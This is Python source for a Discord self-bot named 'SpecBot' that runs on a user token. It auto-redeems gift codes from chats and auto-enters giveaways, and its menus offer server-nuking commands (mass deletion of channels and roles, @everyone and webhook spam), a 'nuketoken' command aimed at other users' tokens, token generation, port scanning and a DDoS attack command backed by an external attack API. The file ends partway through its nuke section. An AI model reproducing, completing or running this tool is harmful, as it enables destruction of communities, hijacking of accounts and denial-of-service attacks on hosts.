import asyncio
import base64
import ctypes
import datetime
import io
import re
import threading
from asyncio import sleep
from datetime import datetime
import json
import random
import string
import time
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import aiohttp
import numpy
import discord
import requests
import os
import colorama
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from requests import post

ctypes.windll.kernel32.SetConsoleTitleW('Welcome to SpecBot! Status: Loading...')
os.system('mode con: cols=75 lines=15')

with open('config.json') as f:
    config = json.load(f)
token = config.get('token') 
prefix = config.get('prefix')
giveaway_sniper = config.get('giveaway_sniper')
nitro_sniper = config.get('nitro_sniper')
error_style = config.get('error_style')


bot = commands.Bot(command_prefix={prefix}, self_bot=True)
intents = discord.Intents.default()
intents.members = True
colorama.init()
Reluctant = discord.Client()
Reluctant = commands.Bot(description='SpecBot', intents=intents, command_prefix=prefix, self_bot=True)
Reluctant.remove_command('help')


# API Stuff
api_url = config.get('api_url')
api_key = config.get('api_key')
max_time = config.get('max_time')
methods = config['methods']

async def loading():
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components .")
    await asyncio.sleep(0.4)
    Clear()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components ..")
    await asyncio.sleep(0.4)
    Clear()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components ...")
    await asyncio.sleep(0.4)
    Clear()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components .")
    await asyncio.sleep(0.4)
    Clear()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components ..")
    await asyncio.sleep(0.4)
    Clear()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components ...")
    await asyncio.sleep(0.4)
    Clear()
    if token == "":
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Token")
        return
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Token")
    await asyncio.sleep(0.5)
    if prefix == "":
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Prefix")
        return
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Prefix")
    await asyncio.sleep(0.5)
    if nitro_sniper == "":
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Nitro Sniper Value")
        return
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Nitro Sniper")
    await asyncio.sleep(0.5)
    if giveaway_sniper == "":
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Giveaway Sniper Value")
        return
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Giveaway Sniper")
    await asyncio.sleep(0.5)
    if error_style == "":
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Error Style (console, embeds)")
        return
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Error Style")
    await asyncio.sleep(0.5)
    if api_key == "":
        print(f"{Fore.YELLOW}↳ Warning: api_url is blank in config.json. This is needed for the DDoS bot.")
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded API Key")
    await asyncio.sleep(0.5)
    if api_url == "":
        print(f"{Fore.YELLOW}↳ Warning: api_key is blank in config.json. This is needed for the DDoS bot.")
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded API Url")
    await asyncio.sleep(0.5)
    if methods == "":
        print(f"{Fore.YELLOW}↳ Warning: methods array is blank in config.json. This is needed for the DDoS bot.")
    else:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Successfully Loaded Methods")
    await asyncio.sleep(0.5)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Loading Components: DONE")
    await asyncio.sleep(0.5)
    Clear()

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''{Fore.RED}

            
  {colorama.Fore.RED}                       {colorama.Fore.WHITE}
 {colorama.Fore.RED}                        {colorama.Fore.WHITE}
 {colorama.Fore.RED} ____                  {colorama.Fore.WHITE} ____        _   
 {colorama.Fore.RED}/ ___| _ __   ___  ___ {colorama.Fore.WHITE}| __ )  ___ | |_ 
 {colorama.Fore.RED}\___ \| '_ \ / _ \/ __ {colorama.Fore.WHITE}|  _ \ / _ \| __|
 {colorama.Fore.RED} ___) | |_) |  __/ (__ {colorama.Fore.WHITE}| |_) | (_) | |_ 
 {colorama.Fore.RED}|____/| .__/ \___|\___ {colorama.Fore.WHITE}|____/ \___/ \__|
  {colorama.Fore.RED}     |_|                              
                {colorama.Fore.WHITE}──────────────────────────{colorama.Fore.RED}─────────────────────────
                           {colorama.Fore.WHITE}Created by: [{colorama.Fore.RED}Clumsy#0420{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}User: [{colorama.Fore.RED}{Reluctant.user.name}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Prefix: [{colorama.Fore.RED}{prefix}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Nitro Sniper: [{colorama.Fore.RED}{nitro}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Giveaway Sniper: [{colorama.Fore.RED}{giveaway}{colorama.Fore.WHITE}]
                           {colorama.Fore.WHITE}Type {colorama.Fore.RED}{prefix}help {colorama.Fore.WHITE} to see commands
                           {colorama.Fore.WHITE}Skidded by Clumsy{colorama.Fore.RED}
             {colorama.Fore.WHITE}─────────────────────────{colorama.Fore.RED}─────────────────────────
    ''' + Fore.WHITE)
    ctypes.windll.kernel32.SetConsoleTitleW(f'SpecBot | Version 1.0 Release | Logged As: {Reluctant.user.name}')


def Clear():
    os.system('cls')


def Init():
    if config.get('token') == "":
        Clear()
        print(f"{Fore.RED}[-] {Fore.WHITE}You didn't fill in your token in the config.json file" + Fore.WHITE)
    else:
        token = config.get('token')
        try:
            Reluctant.run(token, bot=False, reconnect=True)
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Token Entered" + Fore.RESET)
            os.system('pause >NUL')


@Reluctant.event
async def on_connect():
    Clear()
    await loading()
    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    startprint()

@Reluctant.event
async def on_message_edit(before, after):
    await Reluctant.process_commands(after)

@Reluctant.event
async def on_message(message):
    if autoafk is True:
        if isinstance(message.channel, discord.channel.DMChannel) and message.author != Reluctant.user:
            for i in range(1):
                embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
                embed.add_field(name="I am currently AFK using Clumsy#0420 Selfbot.", value="Try again later", inline=False)
                embed.set_footer(text="Auto Reply")
                await message.channel.send(embed=embed)
            print(f"{Fore.GREEN}[-] {Fore.WHITE}{message.author.name} Sent You A Message While You Were AFK")
    elif autoafk is False:
        pass

    def GiveawayData():
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def giveawaywon():
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def NitroData(code):
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Author: {message.author}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Code: {code}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    def NitroDataWon(code):
        print(
            f"{Fore.GREEN}────────────────────────"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Server: {message.guild}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Channel: {message.channel}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Author: {message.author}"
            f"\n{Fore.GREEN}[-] {Fore.WHITE}Code: {code}"
            f"\n{Fore.GREEN}────────────────────────"
            + Fore.RESET)

    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            if 'This gift has been redeemed already.' in r:
                print(f"{Fore.RED}[-] {Fore.WHITE}{code} - Code Already Redeemed" + Fore.RESET)
                NitroData(code)

            elif 'subscription_plan' in r:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}{code} - Code Successfully Redeemed" + Fore.RESET)
                NitroDataWon(code)

            elif 'Unknown Gift Code' in r:
                print(f"{Fore.RED}[-] {Fore.WHITE}{code} - Uknown Code" + Fore.RESET)
                NitroData(code)
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(f"{Fore.RED}[-] {Fore.WHITE}Giveaway Couldn't React" + Fore.RESET)
                    GiveawayData()
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Giveaway Entered" + Fore.RESET)
                giveawaywon()
        else:
            return

    if f'Congratulations <@{Reluctant.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Giveaway Won" + Fore.RESET)
                GiveawayData()
        else:
            return
    await Reluctant.process_commands(message)

@Reluctant.event
async def on_command(ctx):
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Command Executed: {ctx.message.content}")


@Reluctant.event
async def on_command_error(ctx, error):
    if error_style == "console":
        error_str = str(error)
        error = getattr(error, 'original', error)
        if isinstance(error, commands.CommandNotFound):
            return
        elif isinstance(error, commands.CheckFailure):
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}You don't have the required permissions" + Fore.RESET)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}Missing Arguments: {error}" + Fore.RESET)
        elif isinstance(error, numpy.AxisError):
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Image" + Fore.RESET)
        elif isinstance(error, discord.errors.Forbidden):
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}Discord error: {error}" + Fore.RESET)
        elif "Cannot send an empty message" in error_str:
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}Couldn't send a empty message" + Fore.RESET)
        else:
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}{error_str}" + Fore.RESET)
    elif error_style == "embeds":
        error_str = str(error)
        error = getattr(error, 'original', error)
        if isinstance(error, commands.CommandNotFound):
            return
        elif isinstance(error, commands.CheckFailure):
            await ctx.message.delete()
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
            embed.add_field(name=f"```Missing Permissions```", value="You don't have the required permissions", inline=False)
            embed.set_footer(text="Error")
            await ctx.send(embed=embed)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
            embed.add_field(name=f"```Missing Argument```", value="This Command Requires Arguments", inline=False)
            embed.set_footer(text="Error")
            await ctx.send(embed=embed)
        elif isinstance(error, numpy.AxisError):
            await ctx.message.delete()
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
            embed.add_field(name=f"```Invalid Image```", value="That is an invalid image", inline=False)
            embed.set_footer(text="Error")
            await ctx.send(embed=embed)
        elif isinstance(error, discord.errors.Forbidden):
            await ctx.message.delete()
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
            embed.add_field(name=f"```Discord Error```", value=f"{error}", inline=False)
            embed.set_footer(text="Error")
            await ctx.send(embed=embed)
        elif "Cannot send an empty message" in error_str:
            await ctx.message.delete()
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
            embed.add_field(name=f"```Empty Message```", value="Couldn't Send Empty Message", inline=False)
            embed.set_footer(text="Error")
            await ctx.send(embed=embed)
        else:
            await ctx.message.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}{error_str}" + Fore.RESET)


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

# Help Menus Start


@Reluctant.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}nuke```", value="View Nuke Commands", inline=False)
    embed.add_field(name=f"```{prefix}malicious```", value="Show Malicious Commands", inline=False)
    embed.add_field(name=f"```{prefix}admin```", value="Show Admin Commands", inline=False)
    embed.add_field(name=f"```{prefix}account```", value="Show Account Commands", inline=False)
    embed.add_field(name=f"```{prefix}tools```", value="Show Tool Commands", inline=False)
    embed.add_field(name=f"```{prefix}main```", value="Show Main Commands", inline=False)
    embed.add_field(name=f"```{prefix}fun [page]```", value="Show Fun Commands", inline=False)
    embed.add_field(name=f"```{prefix}animated```", value="Show Animated Commands", inline=True)
    embed.add_field(name=f"```{prefix}art```", value="Show Art Commands", inline=False)
    embed.add_field(name=f"```{prefix}backup```", value="Show Backup Commands", inline=False)
    embed.add_field(name=f"```{prefix}nsfw```", value="Show NSFW Commands", inline=False)
    embed.add_field(name=f"```{prefix}ddos```", value="Show Attack Commands", inline=False)
    embed.add_field(name=f"```{prefix}settings```", value="Show Settings", inline=False)
    embed.set_footer(text="Help Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def nuke(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}Clumsy_nuke```", value="All In One Nuke", inline=False)
    embed.add_field(name=f"```{prefix}Clumsy_account```", value="All In Account One Nuke", inline=False)
    embed.add_field(name=f"```{prefix}createchannels [name]```", value="Creates Max Channels", inline=False)
    embed.add_field(name=f"```{prefix}customchannels [amount] [name]```", value="Creates Custom Channels", inline=False)
    embed.add_field(name=f"```{prefix}delchannels```", value="Deletes All Channels", inline=False)
    embed.add_field(name=f"```{prefix}renamechannels [text]```", value="Renames All Channels", inline=False)
    embed.add_field(name=f"```{prefix}createroles [name] [hex_color]```", value="Creates Max Roles", inline=False)
    embed.add_field(name=f"```{prefix}customroles [amount] [name] [hex_color]```", value="Creates Custom Roles", inline=True)
    embed.add_field(name=f"```{prefix}delroles```", value="Deletes All Roles", inline=False)
    embed.add_field(name=f"```{prefix}adminservers```", value="Show All Servers w/ Admin", inline=False)
    embed.set_footer(text="Nuke Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def malicious(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}spamwebhook```", value="Spams Server Webhook (Very Laggy)", inline=False)
    embed.add_field(name=f"```{prefix}stopwebhook```", value="Stops Webhook Spam", inline=False)
    embed.add_field(name=f"```{prefix}nuketoken [token]```", value="Nukes A Token", inline=False)
    embed.add_field(name=f"```{prefix}tokeninfo [token]```", value="Show Tokens Info", inline=False)
    embed.set_footer(text="Malicious Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def admin(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}nukev1```", value="Clear Chat", inline=False)
    embed.add_field(name=f"```{prefix}nukev2 [channel_id]```", value="Deletes Then Remakes Channel", inline=False)
    embed.add_field(name=f"```{prefix}mute [user]```", value="Spams Server Webhook (Very Laggy)", inline=False)
    embed.add_field(name=f"```{prefix}ban [user]```", value="Bans A User", inline=False)
    embed.add_field(name=f"```{prefix}kick [user]```", value="Kicks A User", inline=False)
    embed.add_field(name=f"```{prefix}nickall [text]```", value="Change Everyones Nickname", inline=False)
    embed.add_field(name=f"```{prefix}tokeninfo [token]```", value="Show Tokens Info", inline=False)
    embed.set_footer(text="Admin Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def account(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}createservers [text]```", value="Creates Max Servers", inline=False)
    embed.add_field(name=f"```{prefix}delservers```", value="Deletes All Servers", inline=False)
    embed.add_field(name=f"```{prefix}leaveservers```", value="Leaves All Servers", inline=False)
    embed.add_field(name=f"```{prefix}leavegroups```", value="Leaves All Groups", inline=False)
    embed.add_field(name=f"```{prefix}gamestatus```", value="Sets Your Game Status", inline=False)
    embed.add_field(name=f"```{prefix}watching```", value="Sets Your Watching Status", inline=False)
    embed.add_field(name=f"```{prefix}streaming```", value="Sets Your Streaming Status", inline=False)
    embed.add_field(name=f"```{prefix}listening```", value="Sets Your Listening Status", inline=False)
    embed.add_field(name=f"```{prefix}resetstatus```", value="Reset Your Status", inline=True)
    embed.add_field(name=f"```{prefix}nickname [name]```", value="Sets Your Nickname", inline=False)
    embed.add_field(name=f"```{prefix}namefuck```", value="Sets Weird Name", inline=False)
    embed.add_field(name=f"```{prefix}invisible```", value="Sets Invisible Name", inline=False)
    embed.add_field(name=f"```{prefix}whois [userid]```", value="Show Account Info", inline=False)
    embed.set_footer(text="Account Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def tools(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}geolocate [host]```", value="IP Lookup", inline=False)
    embed.add_field(name=f"```{prefix}portscan [host]```", value="Port Scan", inline=False)
    embed.add_field(name=f"```{prefix}singleportscan [host] [port]```", value="Single Port Scan", inline=False)
    embed.add_field(name=f"```{prefix}validate [host]```", value="IP Validator", inline=False)
    embed.add_field(name=f"```{prefix}domaintoip [domain]```", value="Domain To IP", inline=False)
    embed.add_field(name=f"```{prefix}iptodomain [host]```", value="IP To Domain", inline=False)
    embed.set_footer(text="Tool Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def main(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}pfp [user]```", value="Steals A Profile Picture", inline=False)
    embed.add_field(name=f"```{prefix}servericon```", value="Steals A Server Icon", inline=False)
    embed.add_field(name=f"```{prefix}roleinfo [role]```", value="Shows Info On A Role", inline=False)
    embed.add_field(name=f"```{prefix}proxyscrape```", value="Scrape Proxies", inline=False)
    embed.add_field(name=f"```{prefix}loaded```", value="Shows Amount Of Proxies Loaded", inline=False)
    embed.add_field(name=f"```{prefix}purge [amount]```", value="Purge Messages", inline=False)
    embed.add_field(name=f"```{prefix}clear```", value="Clear Chat", inline=False)
    embed.add_field(name=f"```{prefix}autobump [interval]```", value="Auto Bump", inline=False)
    embed.add_field(name=f"```{prefix}massreact```", value="Reacts To The Newest Message", inline=False)
    embed.add_field(name=f"```{prefix}afkon```", value="Turn AFK On", inline=True)
    embed.add_field(name=f"```{prefix}afkoff```", value="Turn AFK Off", inline=True)
    embed.set_footer(text="Tool Commands")
    await ctx.send(embed=embed)


@Reluctant.command()
async def fun(ctx, page):
    await ctx.message.delete()
    if page == "1":
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")

        embed.add_field(name=f"```{prefix}coinflip```", value="Flips A Coin", inline=True)
        embed.add_field(name=f"```{prefix}tweet [user] [text]```", value="Creates A Fake Tweet", inline=True)
        embed.add_field(name=f"```{prefix}embed [text]```", value="Creates A Custom Embed", inline=True)
        embed.add_field(name=f"```{prefix}ascii [text]```", value="Creates ASCII Text", inline=True)
        embed.add_field(name=f"```{prefix}minesweeper```", value="Minesweeper Game", inline=True)
        embed.add_field(name=f"```{prefix}slots```", value="Slot Game", inline=True)
        embed.add_field(name=f"```{prefix}btc```", value="Shows Bitcoin Value", inline=True)
        embed.add_field(name=f"```{prefix}doge```", value="Shows DogeCoin Value", inline=True)
        embed.add_field(name=f"```{prefix}dog```", value="Shows A Dog Picture", inline=True)
        embed.add_field(name=f"```{prefix}fox```", value="Shows A Fox Picture", inline=True)
        embed.add_field(name=f"```{prefix}panda```", value="Shows A Panda Picture", inline=True)
        embed.add_field(name=f"```{prefix}meme```", value="Shows A Shitty Meme", inline=True)
        embed.add_field(name=f"```{prefix}randomnitro```", value="Creates Random Nitro Code", inline=True)
        embed.add_field(name=f"```{prefix}hug [user]```", value="Hugs A User", inline=True)
        embed.add_field(name=f"```{prefix}slap [user]```", value="Slaps A User", inline=True)
        embed.add_field(name=f"```{prefix}blanktext [amount]```", value="Sends A Message w/ Blank Text", inline=True)
        embed.add_field(name=f"```{prefix}everyonespam [text]```", value="Spams @everyone", inline=True)
        embed.add_field(name=f"```{prefix}faketoken [user]```", value="Shows A Fake Token", inline=True)
        embed.add_field(name=f"```{prefix}createpoll [text]```", value="Creates A Poll", inline=True)
        embed.add_field(name=f"```{prefix}encrypt [text]```", value="Encrypts A Phrase", inline=True)
        embed.add_field(name=f"```{prefix}decrypt [text]```", value="Decrypts A Phrase", inline=True)
        embed.add_field(name=f"```{prefix}fuckpfp [user]```", value="Crazy Profile Picture", inline=True)
        embed.add_field(name=f"```{prefix}changemymind [text]```", value="Change My Mind Meme", inline=True)
        embed.add_field(name=f"```{prefix}iphonex [user]```", value="Shows iPhone X", inline=True)
        embed.set_footer(text="Fun Commands ")
        await ctx.send(embed=embed)
    elif page == "2":
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")

        embed.add_field(name=f"```{prefix}captcha [user]```", value="Shows Captcha", inline=True)
        embed.add_field(name=f"```{prefix}kannagen [txt]```", value="Shows Custom Text", inline=True)
        embed.add_field(name=f"```{prefix}phcomment [user] [text]```", value="Shows PornHub Comment", inline=True)
        embed.add_field(name=f"```{prefix}calculate [number1] [type] [number2]```", value="Calculator [Types: +,-,*,/]",inline=True)
        embed.add_field(name=f"```{prefix}crashgif```", value="Sends A Crash Gif", inline=True)
        embed.add_field(name=f"```{prefix}mentionall```", value="Mentions A Bunch Of Users", inline=True)
        embed.add_field(name=f"```{prefix}pingwweb [url]```", value="Pings A Website", inline=True)
        embed.add_field(name=f"```{prefix}ghostping [amount] [user]```", value="Sends A Ghost Ping", inline=True)
        embed.add_field(name=f"```{prefix}reverse [text]```", value="Reverses Text", inline=True)
        embed.add_field(name=f"```{prefix}rainbowrole```", value="Creates A Rainbow Role", inline=True)
        embed.add_field(name=f"```{prefix}cyclenick [text]```", value="Cycles Thru Text", inline=True)
        embed.add_field(name=f"```{prefix}stopnick```", value="Stop Cycling Thru Text", inline=True)
        embed.add_field(name=f"```{prefix}reversepfp```", value="Lookup Profile Picture", inline=True)
        embed.set_footer(text="Fun Commands (Page 2 )")
        await ctx.send(embed=embed)
    else:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Invalid Page Number```", value="Valid Page Numbers: 1, 2", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Page Number. Valid Page Numbers: 1, 2")
        return


@Reluctant.command()
async def animated(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}fakevirus```", value="Fake Virus Animation", inline=False)
    embed.add_field(name=f"```{prefix}table```", value="Table Animation", inline=False)
    embed.add_field(name=f"```{prefix}boom```", value="Boom Animation", inline=False)
    embed.add_field(name=f"```{prefix}hack [user]```", value="Hacking Animation", inline=False)
    embed.add_field(name=f"```{prefix}penis```", value="Penis Animation", inline=False)
    embed.set_footer(text="Animated Commands ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def art(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```{prefix}ghost```", value="Ghost ASCII", inline=False)
    embed.add_field(name=f"```{prefix}tree```", value="Tree ASCII", inline=False)
    embed.add_field(name=f"```{prefix}shit```", value="Shit ASCII", inline=False)
    embed.add_field(name=f"```{prefix}spider```", value="Spider ASCII", inline=False)
    embed.add_field(name=f"```{prefix}logo```", value="Logo ASCII", inline=False)
    embed.add_field(name=f"```{prefix}island```", value="Island ASCII", inline=False)
    embed.add_field(name=f"```{prefix}castle```", value="Castle ASCII", inline=False)
    embed.add_field(name=f"```{prefix}truck```", value="Truck ASCII", inline=False)
    embed.add_field(name=f"```{prefix}glasses```", value="Glasses ASCII", inline=False)
    embed.add_field(name=f"```{prefix}doggo```", value="Doggo ASCII", inline=False)
    embed.add_field(name=f"```{prefix}phone```", value="Phone ASCII", inline=False)
    embed.add_field(name=f"```{prefix}guitar```", value="Guitar ASCII", inline=False)
    embed.add_field(name=f"```{prefix}pistol```", value="Pistol ASCII", inline=False)
    embed.add_field(name=f"```{prefix}tank```", value="Table ASCII", inline=False)
    embed.add_field(name=f"```{prefix}up```", value="Up ASCII", inline=False)
    embed.add_field(name=f"```{prefix}shower```", value="Shower ASCII", inline=False)
    embed.set_footer(text="Art Commands ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def backup(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    
    embed.add_field(name=f"```{prefix}backupfriends```", value="Backup All Friends", inline=False)
    embed.add_field(name=f"```{prefix}backupservers```", value="Backup All Servers", inline=False)
    embed.add_field(name=f"```{prefix}copyserver```", value="Creates A Backup Server", inline=False)
    embed.set_footer(text="Backup Commands ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def nsfw(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    
    embed.add_field(name=f"```{prefix}tits```", value="Shows A Titty Pic", inline=False)
    embed.add_field(name=f"```{prefix}blowjob```", value="Shows A Blowjob Pic", inline=False)
    embed.add_field(name=f"```{prefix}anal```", value="Shows A Anal Pic", inline=False)
    embed.add_field(name=f"```{prefix}neko```", value="Shows A Neko Pic", inline=False)
    embed.add_field(name=f"```{prefix}lesbian```", value="Shows A Lesbian Pic", inline=False)
    embed.add_field(name=f"```{prefix}cum```", value="Shows A Cumslut Pic", inline=False)
    embed.add_field(name=f"```{prefix}pussy```", value="Shows A Pussy Pic", inline=False)
    embed.set_footer(text="NSFW Commands ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def generators(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    
    embed.add_field(name=f"```{prefix}gentokens```", value="Generate And Check Tokens (Proxyless)", inline=False)
    embed.set_footer(text="Generator Commands ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def ddos(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    
    embed.add_field(name=f"```{prefix}attack [host] [port] [time] [method]```", value="Sends Attack To Host", inline=False)
    embed.add_field(name=f"```{prefix}methods```", value="Shows All Methods", inline=False)
    embed.add_field(name=f"```{prefix}status```", value="Shows API Status", inline=False)
    embed.set_footer(text="DDoS Commands ")
    await ctx.send(embed=embed)


# Help Menus Start

# Nuke Commands Start


def nooooourrolesgotnukedomg(idofguild, nameofchan):
    try:
